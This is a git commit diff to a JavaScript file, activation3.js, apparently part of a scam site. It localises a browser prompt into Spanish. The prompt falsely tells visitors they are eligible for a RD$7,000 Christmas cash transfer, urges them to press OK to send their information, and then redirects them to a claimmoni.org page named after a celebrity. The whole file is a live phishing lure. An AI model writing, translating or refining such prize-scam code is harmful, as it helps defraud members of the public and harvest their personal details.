af7bab242f1dfa65c97f882495638cfcce7478ca
clmmoni <kkween1.00@gmail.com>
2025-12-24 08:56:49 +0100

    Update activation3.js

--- activation3.js
+++ activation3.js
@@ -1,5 +1,5 @@
-var password = 'Submit Now'
-password=prompt('Portal de Regalos: ¡Felicidades! Eres elegible para recibir la transferencia en efectivo de apoyo navideño de RD$7,000. Por favor presiona OK para enviar tu información y recibir RD$7,000 ahora','Submit Now');
-if (password != 'Submit Now') {
+var password = 'Enviar ahora'
+password=prompt('Portal de Regalos: ¡Felicidades! Eres elegible para recibir la transferencia en efectivo de apoyo navideño de RD$7,000. Por favor presiona OK para enviar tu información y recibir RD$7,000 ahora','Enviar ahora');
+if (password != 'Enviar ahora') {
 location.href='https://claimmoni.org/Regalo-por-El-Alfa-Juan-Diaz.html';
 }
